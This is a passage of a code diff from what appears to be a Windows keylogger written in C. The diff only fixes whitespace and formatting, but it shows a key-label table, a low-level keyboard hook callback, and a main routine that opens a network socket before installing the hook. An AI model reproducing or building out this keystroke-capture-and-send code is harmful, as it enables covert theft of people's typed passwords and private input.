@@ -100,17 +100,17 @@ const struct keyboard keyboard[] =
 	{ VK_OEM_MINUS, "[-]" },
 	{ VK_OEM_PLUS, "[+]" },
 	{ VK_OEM_1, "[;]" },
-	{ VK_OEM_3, "[`]"},
+	{ VK_OEM_3, "[`]" },
 	{ VK_OEM_4, "[ [ ]" },
 	{ VK_OEM_5, "[\\]" },
 	{ VK_OEM_6, "[ ] ]" },
 	{ VK_OEM_7, "[']" },
 	{ VK_OEM_COMMA, "," },
-	{ VK_OEM_PERIOD, "."},
+	{ VK_OEM_PERIOD, "." },
 	{ VK_APPS, "[APPS]" },
 	{ 0, "[UNKNOWN]" }
 };
-	
+
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
 	LPKBDLLHOOKSTRUCT kb;
@@ -141,7 +141,6 @@ void	setwinhook()
 #if 0
 	STARTUPINFO startup;
 	PROCESS_INFORMATION process;
-
 	SecureZeroMemory(&startup, sizeof(startup));
 	SecureZeroMemory(&process, sizeof(process));
 	startup.cb = sizeof(startup);
@@ -194,10 +193,10 @@ int	main(void)
 {
 	MSG msg;
 	WSADATA wsadata;
-	
+
 	WSAStartup(MAKEWORD(2, 0), &wsadata);
 	my_sock = init_socket(my_sock);
-	setwinhook();				
+	setwinhook();
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
 		if (PeekMessage(&msg, NULL, WM_CLOSE, WM_CLOSE, PM_NOREMOVE) == TRUE)
